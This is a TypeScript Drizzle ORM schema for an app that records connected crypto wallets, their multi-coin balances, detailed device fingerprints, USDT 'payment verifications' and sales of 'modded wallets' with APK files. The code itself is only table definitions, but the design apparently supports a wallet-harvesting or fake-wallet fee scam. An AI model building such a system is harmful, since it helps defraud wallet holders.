import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, jsonb, serial, boolean, integer, real } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// Wallet claims table - stores all user wallet connections and data
export const claims = pgTable("claims", {
  id: serial("id").primaryKey(),
  walletAddress: varchar("wallet_address", { length: 255 }).notNull().unique(),

  // Crypto balances stored as JSON for flexibility
  balances: jsonb("balances").notNull().$type<{
    ETH?: string;
    BNB?: string;
    USDT_ERC20?: string;
    USDT_TRC20?: string;
    USDT_BEP20?: string;
    USDC?: string;
    DAI?: string;
    MATIC?: string;
    AVAX?: string;
    SOL?: string;
    [key: string]: string | undefined;
  }>(),

  // Device information
  deviceModel: text("device_model"),
  deviceBrowser: text("device_browser"),
  deviceOS: text("device_os"),
  deviceNetwork: text("device_network"),
  deviceBattery: text("device_battery"),
  deviceScreen: text("device_screen"),
  userAgent: text("user_agent"),

  // Wallet type (MetaMask, Trust Wallet, Binance, etc.)
  walletType: varchar("wallet_type", { length: 100 }),

  // Timestamps
  claimedAt: timestamp("claimed_at").notNull().defaultNow(),
  updatedAt: timestamp("updated_at").notNull().defaultNow(),
});

// Payment verifications table - tracks USDT payment verifications
export const paymentVerifications = pgTable("payment_verifications", {
  id: serial("id").primaryKey(),
  walletAddress: varchar("wallet_address", { length: 255 }).notNull(),
  transactionHash: varchar("transaction_hash", { length: 255 }).notNull().unique(),

  // Payment details
  paymentAmount: varchar("payment_amount", { length: 50 }).notNull(),
  requiredAmount: varchar("required_amount", { length: 50 }).notNull(),
  walletProvider: varchar("wallet_provider", { length: 100 }).notNull(),

  // Verification status
  verificationStatus: varchar("verification_status", { length: 50 }).notNull().default("pending"),
  isVerified: boolean("is_verified").notNull().default(false),

  // Workflow stages tracking
  workflowStage: integer("workflow_stage").notNull().default(0),

  // Device and wallet details
  deviceDetails: jsonb("device_details").$type<{
    model?: string;
    browser?: string;
    os?: string;
    mobileVersion?: string;
    [key: string]: any;
  }>(),

  // Roadmap data for showing progress
  roadmapData: jsonb("roadmap_data").$type<{
    stage: number;
    walletName?: string;
    apkName?: string;
    verificationStartTime?: string;
    walletReadyTime?: string;
    estimatedCompletionDays?: number;
    [key: string]: any;
  }>(),

  // Timestamps
  createdAt: timestamp("created_at").notNull().defaultNow(),
  verifiedAt: timestamp("verified_at"),
  updatedAt: timestamp("updated_at").notNull().defaultNow(),
});

// Mod wallet purchases table - stores details of modded wallet purchases
export const modWalletPurchases = pgTable("mod_wallet_purchases", {
  id: serial("id").primaryKey(),
  transactionId: text("transaction_id").notNull().unique(),
  userEmail: text("user_email").notNull(),
  walletType: text("wallet_type").notNull(),
  amount: real("amount").notNull(),
  verifiedAt: timestamp("verified_at").defaultNow().notNull(),
  walletAddress: text("wallet_address").notNull(),
});

// Admin mod wallet verifications table - stores admin verification data for modded wallets
export const adminModWalletVerifications = pgTable("admin_mod_wallet_verifications", {
  id: serial("id").primaryKey(),
  adminEmail: text("admin_email").notNull(),
  transactionId: text("transaction_id").notNull().unique(),
  walletType: text("wallet_type").notNull(),
  amount: real("amount").notNull(),
  deviceDetails: text("device_details").notNull(),
  verifiedAt: timestamp("verified_at").defaultNow().notNull(),
  walletAddress: text("wallet_address").notNull(),
  modFileName: text("mod_file_name").notNull(),
  status: text("status").notNull().default("pending"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

// Insert schemas
export const insertClaimSchema = createInsertSchema(claims).omit({
  id: true,
  claimedAt: true,
  updatedAt: true,
});

export const insertPaymentVerificationSchema = createInsertSchema(paymentVerifications).omit({
  id: true,
  createdAt: true,
  verifiedAt: true,
  updatedAt: true,
});

// Insert schema for admin verification data
export const insertAdminModWalletVerificationSchema = createInsertSchema(adminModWalletVerifications).omit({
  id: true,
  verifiedAt: true,
  createdAt: true,
});

// TypeScript types
export type InsertClaim = z.infer<typeof insertClaimSchema>;
export type Claim = typeof claims.$inferSelect;
export type InsertPaymentVerification = z.infer<typeof insertPaymentVerificationSchema>;
export type PaymentVerification = typeof paymentVerifications.$inferSelect;
export type InsertAdminModWalletVerification = z.infer<typeof insertAdminModWalletVerificationSchema>;
export type AdminModWalletVerification = typeof adminModWalletVerifications.$inferSelect;


// Balances type for better type safety
export type CryptoBalances = {
  ETH?: string;
  BNB?: string;
  USDT_ERC20?: string;
  USDT_TRC20?: string;
  USDT_BEP20?: string;
  USDC?: string;
  DAI?: string;
  MATIC?: string;
  AVAX?: string;
  SOL?: string;
  [key: string]: string | undefined;
};

// Device info type
export type DeviceInfo = {
  model?: string;
  browser?: string;
  os?: string;
  network?: string;
  battery?: string;
  screen?: string;
  userAgent?: string;
};